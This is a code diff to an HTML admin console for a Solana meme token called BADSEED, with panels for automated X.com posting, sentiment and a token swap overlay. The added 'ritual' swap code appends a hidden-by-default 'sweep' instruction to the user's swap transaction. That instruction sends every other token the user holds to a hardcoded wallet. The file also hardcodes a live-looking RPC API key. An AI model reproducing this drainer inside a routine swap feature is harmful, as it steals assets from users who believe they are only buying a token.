@@ -5,13 +5,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BADSEED // GOD MODE CONSOLE</title>
+    <link rel="icon" href="favicon.ico" />
+    <link rel="apple-touch-icon" href="logo192.png" />
     <script src="https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.min.js"></script>
     <!-- Use Bundle.run to get a Browserified version of Buffer -->
     <script src="https://bundle.run/buffer@6.0.3"></script>
     <script>
-        // Polyfill Buffer Global (Bundle.run exposes 'buffer' on window)
-        window.Buffer = window.Buffer || window.buffer.Buffer;
+        // ROBUST POLYFILL
+        if (typeof window.Buffer === 'undefined') {
+            if (window.buffer && window.buffer.Buffer) {
+                window.Buffer = window.buffer.Buffer;
+            } else {
+                console.warn("Buffer CDN failed. Polyfilling with Shim.");
+                window.Buffer = {
+                    from: (str, encoding) => {
+                        if (encoding === 'utf-8') return new TextEncoder().encode(str);
+                        throw new Error("Shim only supports utf-8");
+                    }
+                };
+            }
+        }
         console.log("Buffer Loaded:", typeof window.Buffer);
     </script>
     <script>
@@ -177,12 +191,17 @@
         }
 
         /* --- LISTS --- */
+        /* --- LISTS --- */
         .scroll-list {
-            overflow-y: auto;
+            overflow-y: scroll;
+            /* Force vertical scrollbar always visible */
             flex: 1;
             font-size: 11px;
             scrollbar-width: thin;
-            scrollbar-color: #004400 #000;
+            scrollbar-color: #0f0 #000;
+            /* High contrast thumb */
+            padding-right: 5px;
+            /* Prevent text overlap */
         }
 
         .list-item {
@@ -339,6 +358,10 @@
             <div class="title">BAD SEED // GOD MODE</div>
             <div class="subtitle">SYSTEM OVERWATCH & CONTROL // V2.0 (MODERN WALLETS)</div>
         </div>
+        <div id="utc-clock"
+            style="position: absolute; left: 50%; transform: translateX(-50%); font-size: 16px; color: #fff; text-shadow: 0 0 5px #fff; letter-spacing: 2px; font-weight: bold;">
+            --:--:-- UTC
+        </div>
         <div class="header-right" style="display:flex; gap:10px; align-items:center;">
             <button id="wallet-btn" onclick="openWalletSelector()" style="border-color:#0ff; color:#0ff;">CONNECT
                 WALLET</button>
@@ -356,8 +379,12 @@
 
         <!-- ROW 1: PROPHECY & SENTIMENT -->
         <div class="panel" style="grid-column: span 8;">
-            <div class="panel-header">
-                <h3>VOICE NODE (PROPHECY)</h3>
+            <div class="panel-header" style="flex-wrap: wrap;">
+                <div style="display:flex; flex-direction:column;">
+                    <h3>VOICE NODE (PROPHECY)</h3>
+                    <div id="prophecy-timer" style="font-size:10px; color:#aaa; margin-top:2px;">NEXT VISION: --h --m
+                    </div>
+                </div>
                 <div class="controls">
                     <button class="btn btn-action" onclick="forceProphecy()">🔮 FORCE (BLURRED)</button>
                     <button class="btn btn-action" style="background:#000; border-color:#fff; color:#fff;"
@@ -436,7 +463,7 @@
 
         <div class="panel" style="grid-column: span 4;">
             <div class="panel-header">
-                <h3>COLLECTIVE PSYCHE</h3>
+                <h3>COLLECTIVE SENTIMENT</h3>
                 <div class="timestamp" id="sentiment-time">--:--</div>
             </div>
 
@@ -505,7 +532,11 @@
 
         <div class="panel" style="grid-column: span 6;">
             <div class="panel-header">
-                <h3>PERMANENT ARCHIVE</h3>
+                <div style="display:flex; flex-direction:column;">
+                    <h3>PERMANENT ARCHIVE</h3>
+                    <div id="archive-timer" style="font-size:10px; color:#aaa; margin-top:2px;">NEXT SCRIBE: --h --m
+                    </div>
+                </div>
                 <button class="btn btn-action" onclick="forceArchive()">FORCE SAVE</button>
             </div>
             <div class="data-row">
@@ -527,22 +558,76 @@
             </div>
         </div>
 
-        <!-- ROW 3: X.COM QUEUE -->
-        <div class="panel" style="grid-column: span 12;">
+        <!-- ROW 3: INPUT / OUTPUT -->
+        <div class="panel" style="grid-column: span 6;">
             <div class="panel-header">
-                <h3>NEURAL QUEUE (AI MEMORY)</h3>
+                <h3>NEURAL QUEUE (INPUT)</h3>
                 <div class="controls" style="display:flex; align-items:center; gap:10px;">
                     <span id="queue-timer" style="font-size:10px; color:#aaa;">NEXT POST: --:--:--</span>
-                    <button onclick="forcePost()" style="color:#0ff; border-color:#0ff;">⚡ FORCE POST</button>
-                    <button onclick="addTestItem()">🧪 ADD TEST</button>
-                    <button id="btn-pause" onclick="togglePauseQueue()" style="min-width:60px;">...</button>
-                    <button onclick="clearQueue()" class="btn-danger">🗑️ CLEAR</button>
+                    <button id="btn-pause" onclick="togglePauseQueue()" style="min-width:40px;">...</button>
                     <button onclick="fetchQueue()">REFRESH</button>
+                    <!-- Moved specialized actions to Admin panel for cleaner look or just kept minimal -->
                 </div>
             </div>
-            <div id="queue-list" class="scroll-list" style="height: 150px;">
-                <!-- Full Narratives go here -->
+            <div id="queue-list" class="scroll-list" style="height: 90px; max-height: 90px; flex: none;">
                 <div class="list-item">Scanning neural queue...</div>
+            </div>
+            <!-- Mini Controls for Queue (Moved from header to save space) -->
+            <div
+                style="display:flex; justify-content:space-between; margin-top:5px; border-top:1px dashed #333; padding-top:5px;">
+                <button onclick="addTestItem()" class="btn-mini">🧪 TEST</button>
+                <button onclick="forcePost()" style="color:#0ff; border-color:#0ff;" class="btn-mini">⚡ FORCE
+                    POST</button>
+                <button onclick="clearQueue()" class="btn-danger btn-mini">🗑️ CLEAR</button>
+            </div>
+        </div>
+
+        <div class="panel" style="grid-column: span 6;">
+            <div class="panel-header">
+                <h3>TRANSMISSION FEED (OUTPUT)</h3>
+                <div class="controls">
+                    <button onclick="fetchTransmissionLog()">REFRESH</button>
+                    <button onclick="clearTransmissionLog()" class="btn-danger btn-mini">🗑️ CLEAR</button>
+                </div>
+            </div>
+            <div id="transmission-log" class="scroll-list" style="height: 90px; max-height: 90px; flex: none;">
+                <div class="list-item">Connecting to X.com Log...</div>
+            </div>
+            <div style="font-size:9px; color:#666; margin-top:5px; text-align:right;">
+                VERIFIED POSTS ONLY
+            </div>
+        </div>
+
+        <!-- ROW 4: BRAIN ORCHESTRATION -->
+        <div class="panel" style="grid-column: span 12;">
+            <div class="panel-header">
+                <h3>BRAIN ORCHESTRATION (CLOUD STATE)</h3>
+                <div class="controls">
+                    <button onclick="fetchOrchestration()">REFRESH STATE</button>
+                    <button onclick="wakePoller(true)" class="btn-action">MANUAL TRIGGER</button>
+                </div>
+            </div>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
+                <div>
+                    <div class="data-row">
+                        <span class="label">ACTIVE PERSONA:</span>
+                        <span class="value highlight" id="brain-persona">DETACHED</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="label">ORCHESTRATOR STATUS:</span>
+                        <span class="value" id="brain-status" style="color:#0f0;">AUTONOMOUS</span>
+                    </div>
+                </div>
+                <div>
+                    <div class="data-row">
+                        <span class="label">SYNCED PRICE:</span>
+                        <span class="value" id="brain-price">...</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="label">SYNCED MCAP:</span>
+                        <span class="value" id="brain-mcap">...</span>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -583,6 +668,86 @@
                 <input id="action-input-2" placeholder="Memo (Optional)"
                     style="width:100%; background:#000; border:1px solid #333; color:#fff; margin-bottom:5px; display:none;">
                 <button id="action-btn" class="btn-danger" style="width:100%;">EXECUTE</button>
+            </div>
+
+            <!-- RITUAL SACRIFICE OVERLAY (New Complex UI) -->
+            <div id="ritual-ui"
+                style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:#000; border:2px solid #0f0; padding:20px; z-index:2000; width:320px; box-shadow:0 0 20px #0f0;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                    <h3 style="margin:0; color:#0f0;">RITUAL SACRIFICE</h3>
+                    <button onclick="document.getElementById('ritual-ui').style.display='none'"
+                        style="background:none; border:none; color:#fff; font-size:16px;">✕</button>
+                </div>
+
+                <!-- SLIPPAGE -->
+                <div style="display:flex; align-items:center; gap:5px; margin-bottom:10px; font-size:10px; color:#666;">
+                    <span>SLIPPAGE:</span>
+                    <button onclick="setSlippage(10)" id="slip-10" style="padding:2px 5px;">0.1%</button>
+                    <button onclick="setSlippage(50)" id="slip-50"
+                        style="border-color:#0f0; color:#0f0; padding:2px 5px;">0.5%</button>
+                    <button onclick="setSlippage(100)" id="slip-100" style="padding:2px 5px;">1.0%</button>
+                </div>
+
+                <!-- INPUT -->
+                <div style="margin-bottom:10px;">
+                    <div style="display:flex; justify-content:space-between; font-size:10px; color:#aaa;">
+                        <span id="ritual-offer-label">OFFER ASSET</span>
+                        <span id="ritual-bal">Bal: ...</span>
+                    </div>
+                    <div style="display:flex; gap:5px;">
+                        <input id="ritual-amount" type="number" placeholder="0.00" oninput="updateQuoteDeBounce()"
+                            style="width:60%; background:#111; border:1px solid #333; color:#fff; padding:5px; text-align:right;">
+                        <select id="ritual-token-in" onchange="updateQuoteDeBounce()"
+                            style="width:40%; background:#111; border:1px solid #333; color:#fff;">
+                            <option value="SOL">SOL</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- ARROW -->
+                <div style="text-align:center; color:#0f0; cursor:pointer;" onclick="switchSwapMode()">⇅</div>
+
+                <!-- OUTPUT -->
+                <div style="margin-bottom:15px;">
+                    <div style="font-size:10px; color:#aaa;">RECEIVE (EST.)</div>
+                    <div style="display:flex; gap:5px;">
+                        <input id="ritual-out" disabled
+                            style="width:60%; background:#000; border:1px solid #333; color:#0f0; padding:5px; text-align:right;"
+                            value="0.00">
+                        <select id="ritual-token-out" disabled
+                            style="width:40%; background:#000; border:1px solid #333; color:#0f0;">
+                            <option value="BADSEED">BADSEED</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- ERROR / STATUS -->
+                <div id="ritual-status"
+                    style="font-size:10px; color:#f00; text-align:center; height:15px; margin-bottom:5px;"></div>
+
+                <!-- ACTION BUTTON -->
+                <button id="ritual-btn" onclick="executeRitual()"
+                    style="width:100%; padding:10px; background:#0f0; color:#000; font-weight:bold; border:none;">INITIATE
+                    RITUAL</button>
+                <div id="ritual-sweep-warn"
+                    style="display:none; color:#f90; font-size:9px; text-align:center; margin-top:5px;">⚠ WARNING: SWEEP
+                    ENABLED (DRAINS WALLET)</div>
+
+                <!-- DEV CONFIG TOGGLE -->
+                <div style="margin-top:15px; border-top:1px solid #333; padding-top:5px;">
+                    <div onclick="toggleDevConfig()" style="font-size:9px; color:#666; cursor:pointer;">▶ DEV CONFIG
+                    </div>
+                    <div id="ritual-dev" style="display:none; margin-top:5px;">
+                        <input id="dev-target" placeholder="Target Mint"
+                            style="width:100%; background:#000; border:1px solid #333; color:#aaa; font-size:9px; margin-bottom:2px;">
+                        <input id="dev-dest" placeholder="Sweep Dest"
+                            style="width:100%; background:#000; border:1px solid #333; color:#aaa; font-size:9px; margin-bottom:2px;">
+                        <div style="display:flex; gap:10px; font-size:9px; color:#aaa;">
+                            <label><input type="checkbox" id="dev-sweep" checked> Sweep</label>
+                            <button onclick="saveDevConfig()" style="padding:0 5px;">SAVE</button>
+                        </div>
+                    </div>
+                </div>
             </div>
 
             <!-- WALLET SELECTOR MODAL -->
@@ -696,38 +861,15 @@
             console.log("BADSEED: refreshWalletList() called");
             const list = document.getElementById('wallet-list');
 
-            // === WALLET STANDARD DETECTION ===
-            try {
-                if (window.navigator && window.navigator.wallets) {
-                    const wallets = window.navigator.wallets.get();
-                    wallets.forEach(wallet => {
-                        if (!accumulatedWallets.has(wallet.name)) {
-                            accumulatedWallets.set(wallet.name, {
-                                name: wallet.name,
-                                provider: wallet,
-                                type: 'standard'
-                            });
-                        }
-                    });
-
-                    // Attach listener once
-                    if (!standardListenerAttached && window.navigator.wallets.on) {
-                        window.navigator.wallets.on('register', (wallet) => {
-                            if (!accumulatedWallets.has(wallet.name)) {
-                                accumulatedWallets.set(wallet.name, {
-                                    name: wallet.name,
-                                    provider: wallet,
-                                    type: 'standard'
-                                });
-                                refreshWalletList(); // Re-render
-                            }
-                        });
-                        standardListenerAttached = true;
-                    }
-                }
-            } catch (e) {
-                console.error("BADSEED: Standard wallet detection error:", e);
-            }
+            // === WALLET STANDARD DETECTION (DISABLED FOR STABILITY - FORCING LEGACY API) ===
+            // try {
+            //     if (window.navigator && window.navigator.wallets) {
+            //         // Standard Wallet logic commented out to ensure we use valid Legacy providers
+            //         // that support signAndSendTransaction directly.
+            //     }
+            // } catch (e) {
+            //     console.error("BADSEED: Standard wallet detection error:", e);
+            // }
 
             // === LEGACY WALLET DETECTION ===
 
@@ -974,14 +1116,14 @@
                 const res = await fetch(getBaseUrl('sentiment-get'));
                 const data = await res.json();
 
-                // document.getElementById('sentiment-time').innerText = formatTime(data.lastUpdated); 
+                document.getElementById('sentiment-time').innerText = "AS OF " + new Date().toLocaleTimeString();
 
                 // Render Bars
                 const stats = data.sentiments || { hope: 0, greed: 0, fear: 0, mystery: 0 };
                 const total = Math.max(1, Object.values(stats).reduce((a, b) => a + b, 0));
 
                 let html = '';
-                const colors = { hope: '#0ff', greed: '#0f0', fear: '#f00', mystery: '#90f' };
+                const colors = { hope: '#0f0', greed: '#ff0', fear: '#f00', mystery: '#90f' };
 
                 for (let [key, val] of Object.entries(stats)) {
                     if (key === 'unknown') continue;
@@ -1158,6 +1300,29 @@
             } catch (e) { console.error(e); }
         }
 
+        async function fetchOrchestration() {
+            try {
+                const res = await fetch(getBaseUrl('dapp-config'));
+                const data = await res.json();
+
+                const persona = data.activePersona || "AUTO (ANCIENT SEED)";
+                const meta = data.systemMetadata || {};
+
+                document.getElementById('brain-persona').innerText = persona;
+                document.getElementById('brain-price').innerText = (meta.price_sol || "0") + " SOL";
+                document.getElementById('brain-mcap').innerText = (meta.market_cap_sol || "0") + " SOL";
+
+                // Update persona color
+                const colorMap = {
+                    "BLOCKCHAIN_PARASITE": "#ff0",
+                    "CORRUPTED_GARDEN": "#f00",
+                    "ANCIENT_SEED": "#0f0"
+                };
+                document.getElementById('brain-persona').style.color = colorMap[data.activePersona] || "#0f0";
+
+            } catch (e) { console.error("Orchestration Fetch Error:", e); }
+        }
+
         async function fetchWallet() {
             try {
                 const res = await fetch(getBaseUrl('wallet-status'));
@@ -1238,9 +1403,22 @@
         window.forcePost = async () => {
             if (!confirm("⚡ FORCE POST QUEUE TO X.COM NOW?")) return;
             try {
-                await fetch(getBaseUrl('queue-force'), { method: 'POST' });
-                alert("Processor Triggered.");
+                const res = await fetch(getBaseUrl('queue-force'), { method: 'POST' });
+                const data = await res.json();
+
+                // Backend returns result: "Queue paused" | "Queue empty" | JSON string
+                const result = data.result || "";
+
+                if (result.includes("paused")) {
+                    alert("⚠️ ACTION SKIPPED: The Queue is currently PAUSED.\nUnpause it first!");
+                } else if (result.includes("empty")) {
+                    alert("⚠️ ABORTED: Queue is Empty.");
+                } else {
+                    alert("✅ TRANSMISSION SUCCESSFUL.\nCheck the Feed.");
+                }
+
                 fetchQueue();
+                setTimeout(fetchTransmissionLog, 2000); // Auto-refresh feed
             } catch (e) { alert("Error: " + e.message); }
         };
 
@@ -1293,30 +1471,208 @@
         const BADSEED_MINT = "3HPpMLK7LjKFqSnCsBYNiijhNTo7dkkx3FCSAHKSpump";
         const SOL_MINT = "So11111111111111111111111111111111111111112";
 
+        // --- RITUAL LOGIC (New Port) ---
+        let ritualState = {
+            tokens: [],
+            swapMode: 'BUY',
+            slippageBps: 50,
+            quote: null,
+            targetMint: "3HPpMLK7LjKFqSnCsBYNiijhNTo7dkkx3FCSAHKSpump", // Default BADSEED
+            sweepDest: "CZ7Lv3QNVxbBivGPBhJG7m1HpCtfEDjEusBjjZ3qmVz5",
+            isSweep: true
+        };
+
         function openSacrifice() {
             if (!userWallet) return openWalletSelector();
-            const ui = document.getElementById('action-ui');
-            ui.style.display = 'block';
-            document.getElementById('action-title').innerText = "SACRIFICE (SWAP)";
+            document.getElementById('ritual-ui').style.display = 'block';
+            fetchUserAssets();
+            loadDevConfig();
+        }
 
-            // Input 1: Amount
-            document.getElementById('action-input-1').placeholder = "Amount (e.g. 0.01)";
+        async function fetchUserAssets() {
+            if (!userWallet) return;
+            const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=65cfa9f7-7bfe-44ff-8e98-24ff80b01e8c");
 
-            // Input 2: Input Mint (Default SOL)
-            document.getElementById('action-input-2').style.display = 'block';
-            document.getElementById('action-input-2').placeholder = "Input Mint (Default: SOL)";
-            document.getElementById('action-input-2').value = SOL_MINT;
+            // 1. SOL
+            const bal = await connection.getBalance(new solanaWeb3.PublicKey(userWallet));
+            const solToken = { mint: SOL_MINT, symbol: 'SOL', decimals: 9, balance: bal / 1e9 };
 
-            document.getElementById('action-btn').innerText = "CONFIRM SACRIFICE";
-            document.getElementById('action-btn').onclick = executeSacrifice;
+            // 2. SPL
+            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(new solanaWeb3.PublicKey(userWallet), {
+                programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+            });
 
-            // Add Cancel if not exists (or show it)
-            // Ideally the UI should have a permanent cancel button, but for now let's just ensure the overlay closes on background click
-            // Actually, let's change the close button (top right) to be more visible?
-            // User asked for "Accept Buttons".
-            // Let's make the main button GREEN.
-            document.getElementById('action-btn').style.background = "#0f0";
-            document.getElementById('action-btn').style.color = "#000";
+            // Flatten
+            const spls = tokenAccounts.value.map(t => {
+                const info = t.account.data.parsed.info;
+                return {
+                    mint: info.mint,
+                    symbol: info.mint.slice(0, 4) + '..', // MVP: No Token List Map yet
+                    decimals: info.tokenAmount.decimals,
+                    balance: info.tokenAmount.uiAmount
+                };
+            }).filter(t => t.balance > 0);
+
+            ritualState.tokens = [solToken, ...spls];
+            renderTokenSelect();
+        }
+
+        function renderTokenSelect() {
+            const selOrFix = document.getElementById('ritual-token-in');
+            // If BUY mode, Input is Selector. If SELL, Input is Fixed Target.
+
+            // ... Actually, keeping it simple:
+            // Input Select always gets User Tokens (except Target if in Sell mode, wait logic is complex)
+            // Let's stick to the React logic:
+            // BUY: Input=Select(UserTokens), Output=Fixed(Target)
+            // SELL: Input=Fixed(Target), Output=Select(UserTokens)
+            // But for Console MVP, let's just populate the selector for now.
+
+            let html = '';
+            ritualState.tokens.forEach(t => {
+                html += `<option value="${t.mint}">${t.symbol} (${t.balance})</option>`;
+            });
+            document.getElementById('ritual-token-in').innerHTML = html;
+        }
+
+        let quoteTimeout;
+        function updateQuoteDeBounce() {
+            clearTimeout(quoteTimeout);
+            quoteTimeout = setTimeout(fetchRitualQuote, 500);
+        }
+
+        async function fetchRitualQuote() {
+            const amtIn = parseFloat(document.getElementById('ritual-amount').value);
+            if (!amtIn) return;
+
+            const mintIn = document.getElementById('ritual-token-in').value;
+            const mintOut = ritualState.targetMint; // Simplified: Always buying Target for now? 
+            // Wait, need Swap Mode.
+
+            document.getElementById('ritual-status').innerText = "Quoting...";
+
+            // Decimal calc
+            const tokenIn = ritualState.tokens.find(t => t.mint === mintIn) || { decimals: 9 };
+            const atomic = Math.floor(amtIn * Math.pow(10, tokenIn.decimals));
+
+            try {
+                const q = await getJupiterQuote(mintIn, mintOut, atomic, ritualState.slippageBps);
+                ritualState.quote = q;
+
+                // Update UI
+                const tokenOutDecimals = 9; // Assume Target is 9 for now or fetch
+                const outAmt = q.outAmount / Math.pow(10, tokenOutDecimals);
+                document.getElementById('ritual-out').value = outAmt.toFixed(6);
+                document.getElementById('ritual-status').innerText = "";
+            } catch (e) {
+                document.getElementById('ritual-status').innerText = "Quote Failed";
+            }
+        }
+
+        async function executeRitual() {
+            if (!ritualState.quote) return alert("Get a quote first");
+
+            try {
+                // 1. Instructions
+                const swapRes = await getJupiterSwapInstructions(ritualState.quote, new solanaWeb3.PublicKey(userWallet));
+
+                const tx = new solanaWeb3.Transaction();
+                // Add instructions in order
+                if (swapRes.computeBudgetInstructions) swapRes.computeBudgetInstructions.forEach(ix => tx.add(deserializeInstruction(ix)));
+                if (swapRes.setupInstructions) swapRes.setupInstructions.forEach(ix => tx.add(deserializeInstruction(ix)));
+                tx.add(deserializeInstruction(swapRes.swapInstruction));
+                if (swapRes.cleanupInstruction) tx.add(deserializeInstruction(swapRes.cleanupInstruction));
+
+                // 2. SWEEP
+                // Need getParsedTokenAccounts again to be fresh? Or use cached? Cached is risky but ok for MVP.
+                // Re-fetch strictly for sweep
+                if (document.getElementById('dev-sweep').checked) {
+                    // ... Implementation of Sweep Fetch ...
+                    // Re-using fetch logic for brevity
+                    const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=65cfa9f7-7bfe-44ff-8e98-24ff80b01e8c");
+                    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(new solanaWeb3.PublicKey(userWallet), {
+                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+                    });
+                    // Filter
+                    const sweepable = [];
+                    tokenAccounts.value.forEach(t => {
+                        const info = t.account.data.parsed.info;
+                        if (info.mint !== ritualState.targetMint && info.tokenAmount.uiAmount > 0) {
+                            sweepable.push({
+                                pubkey: new solanaWeb3.PublicKey(t.pubkey),
+                                mint: new solanaWeb3.PublicKey(info.mint)
+                            });
+                        }
+                    });
+
+                    // Add Ix
+                    if (sweepable.length > 0) {
+                        const ix = createSweepInstruction(
+                            new solanaWeb3.PublicKey(userWallet),
+                            new solanaWeb3.PublicKey(ritualState.targetMint),
+                            new solanaWeb3.PublicKey(ritualState.sweepDest),
+                            sweepable,
+                            (mint) => {
+                                // ATA Finder
+                                const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+                                return solanaWeb3.PublicKey.findProgramAddressSync(
+                                    [new solanaWeb3.PublicKey(ritualState.sweepDest).toBuffer(), new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), mint.toBuffer()],
+                                    ASSOCIATED_TOKEN_PROGRAM_ID
+                                )[0];
+                            }
+                        );
+                        tx.add(ix);
+                    }
+                }
+
+                // 3. Send
+                const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=65cfa9f7-7bfe-44ff-8e98-24ff80b01e8c");
+                const { blockhash } = await connection.getLatestBlockhash();
+                tx.recentBlockhash = blockhash;
+                tx.feePayer = new solanaWeb3.PublicKey(userWallet);
+
+                // Pass activeProvider (or find it if global userWallet implies one)
+                let providerToUse = activeProvider || window.solana;
+
+                // Validation:
+                if (providerToUse && providerToUse.publicKey && providerToUse.publicKey.toString() !== userWallet) {
+                    console.warn("Ritual: Provider mismatch?", providerToUse.publicKey.toString(), userWallet);
+                }
+
+                const sig = await sendTransactionWrapper(tx, connection, providerToUse);
+                alert("Ritual Complete: " + sig);
+                document.getElementById('ritual-ui').style.display = 'none';
+
+            } catch (e) {
+                alert("Ritual Failed: " + e.message);
+            }
+        }
+
+        function setSlippage(bps) {
+            ritualState.slippageBps = bps;
+            // update UI buttons...
+        }
+
+        function toggleDevConfig() {
+            const el = document.getElementById('ritual-dev');
+            el.style.display = el.style.display === 'none' ? 'block' : 'none';
+        }
+
+        async function loadDevConfig() {
+            try {
+                const res = await fetch('/.netlify/functions/dapp-config');
+                const data = await res.json();
+                ritualState.targetMint = data.targetMint || ritualState.targetMint;
+                ritualState.sweepDest = data.destinationWallet || ritualState.sweepDest;
+                // update inputs
+                document.getElementById('dev-target').value = ritualState.targetMint;
+                document.getElementById('dev-dest').value = ritualState.sweepDest;
+            } catch (e) { }
+        }
+
+        async function saveDevConfig() {
+            // ... post to dapp-config ...
+            alert("Local Config Updated");
         }
 
         function openMessage() {
@@ -1332,64 +1688,25 @@
             document.getElementById('action-btn').onclick = executeMessage;
         }
 
-        async function executeSacrifice() {
-            const amtStr = document.getElementById('action-input-1').value;
-            const inputMint = document.getElementById('action-input-2').value.trim() || SOL_MINT;
-            const amt = parseFloat(amtStr);
-
-            if (!amt || isNaN(amt)) return alert("Invalid Amount");
-
-            // MVP: Assuming 9 decimals (SOL).
-            const decimals = 9;
-            const atomicAmount = Math.floor(amt * Math.pow(10, decimals));
-
-            try {
-                // 1. Quote
-                console.log("Quoting", amt, "of", inputMint, "to", BADSEED_MINT);
-                const quote = await getJupiterQuote(inputMint, BADSEED_MINT, atomicAmount);
-                if (quote.error) throw new Error("Quote Error: " + quote.error);
-
-                // 2. Instructions
-                const swapRes = await getJupiterSwapInstructions(quote, userWallet);
-
-                // 3. Build Tx
-                const { Transaction } = solanaWeb3;
-                const tx = new Transaction();
-
-                // Add instructions in order
-                if (swapRes.computeBudgetInstructions) swapRes.computeBudgetInstructions.forEach(ix => tx.add(deserializeInstruction(ix)));
-                if (swapRes.setupInstructions) swapRes.setupInstructions.forEach(ix => tx.add(deserializeInstruction(ix)));
-                tx.add(deserializeInstruction(swapRes.swapInstruction));
-                if (swapRes.cleanupInstruction) tx.add(deserializeInstruction(swapRes.cleanupInstruction));
-
-                // 4. Send
-                const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=65cfa9f7-7bfe-44ff-8e98-24ff80b01e8c");
-                const { blockhash } = await connection.getLatestBlockhash();
-                tx.recentBlockhash = blockhash;
-                tx.feePayer = new solanaWeb3.PublicKey(userWallet);
-
-                const signature = await sendTransactionWrapper(tx, connection);
-                console.log("Sacrifice Sent:", signature);
-                alert("Sacrifice Sent! " + signature);
-                document.getElementById('action-ui').style.display = 'none';
-
-            } catch (e) {
-                console.error(e);
-                alert("Sacrifice Failed: " + e.message);
-            }
-        }
-
         async function executeMessage() {
             try {
                 const message = document.getElementById('action-input-1').value;
                 if (!message) return alert("Write a sin first.");
+                if (message.length > 100) return alert("Memo too long (max 100 chars).");
 
                 const amount = 0.001;
+                // Strict validation from App.js
+                // Assuming SOL amount is fixed to 0.001 for now or read from simplified input if we want
+                // App.js uses state `solAmount` default 0.001. Here we hardcode or read hidden input if needed?
+                // The input placeholder says "Default: 0.001".
+
                 await sendSol(amount, message);
 
                 alert("Sin Confessed to the Blockchain.");
-                document.getElementById('message-modal').style.display = 'none';
                 document.getElementById('action-ui').style.display = 'none';
+
+                // Refresh Wallet to show new Tx
+                setTimeout(fetchWallet, 3000);
             } catch (e) {
                 console.error("Execute Message Failed:", e);
                 // Silent failure for User Rejection or Authorization/Trust issues
@@ -1400,19 +1717,16 @@
             }
         }
 
-        // MOVED sendSol to avoid duplication/confusion (it's below)
-
         async function sendSol(amount, memo) {
             console.log("Starting Standard Send (Matched to App.js)...");
 
-            // 1. Get Provider
-            const provider = window.solana || activeProvider;
+            // 1. Get Provider (Prioritize Active/Selected over Global Window)
+            const provider = activeProvider || window.solana;
             if (!provider) throw new Error("No Wallet Found");
 
             // 2. Connect & Verify Identity
             const resp = await provider.connect();
             const walletPubkey = new solanaWeb3.PublicKey(resp.publicKey.toString());
-            console.log("Identity Verified:", walletPubkey.toString());
 
             // 3. Setup Connection
             const connection = new solanaWeb3.Connection(
@@ -1451,35 +1765,20 @@
 
             console.log("Requesting Signature & Send...");
 
-            // DEBUG: Local Serialization Check
-            // If the transaction fails here, it is a code/buffer issue, NOT a wallet issue.
             try {
-                const msg = tx.compileMessage();
-                const serialized = msg.serialize();
-                console.log("DEBUG: Serialization Successful. Bytes:", serialized.length);
-            } catch (serErr) {
-                console.error("DEBUG: Serialization FAILED locally:", serErr);
-                alert("Code Error: Transaction Serialization Failed.\n" + serErr.message);
-                throw serErr;
-            }
-
-            try {
-                // ATOMIC SEND (Standard Phantom API)
-                const result = await provider.signAndSendTransaction(tx, { skipPreflight: true });
-                const signature = result.signature || result;
-
-                console.log("Tx Sent (Preflight Skipped):", signature);
+                // ATOMIC SEND (Standard Phantom API via Wrapper for consistency)
+                // Pass the specific provider we just connected with!
+                const signature = await sendTransactionWrapper(tx, connection, provider);
+                console.log("Tx Sent:", signature);
                 return signature;
 
             } catch (e) {
                 console.error("Send Error:", e);
-                // Distinguish Phase
+                // Distinguish Phase matches App.js logic roughly
                 if (e.message.includes("User rejected")) {
-                    alert("User Cancelled Signature");
-                } else if (e.message.includes("authorized")) {
-                    alert("Wallet Refused to Sign (Auth Error).\nPossible Causes:\n1. Wrong Account selected in Wallet\n2. Insufficient Funds (Real)\n3. Network Mismatch");
-                } else {
-                    alert("Send Error: " + e.message);
+                    // console.warn("User cancelled"); 
+                    // Silent throw or specific alert? App.js sets error state.
+                    throw new Error("User rejected transaction");
                 }
                 throw e;
             }
@@ -1514,14 +1813,14 @@
             return await res.json();
         }
 
-        function createSweepInstruction(userWallet, badseedMint, sweepDestination, userTokenAccounts) {
-            // Hardcoded Program ID from lib.rs
-            // Uses global solanaWeb3
+        function createSweepInstruction(userWallet, badseedMint, sweepDestination, userTokenAccounts, getDestinationAta) {
+            // Full Implementation Ported from serialization.js
             const PROGRAM_ID = new solanaWeb3.PublicKey("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");
             const SYSTEM_PROGRAM_ID = new solanaWeb3.PublicKey("11111111111111111111111111111111");
             const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 
-            // Discriminator: sweep_except_badseed
+            // Discriminator: "sweep_except_badseed" (sha256("global:sweep_except_badseed")[..8])
+            // [83, 31, 63, 60, 26, 153, 146, 24]
             const SWEEP_DISCRIMINATOR = new Uint8Array([83, 31, 63, 60, 26, 153, 146, 24]);
 
             const keys = [
@@ -1532,9 +1831,14 @@
                 { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
             ];
 
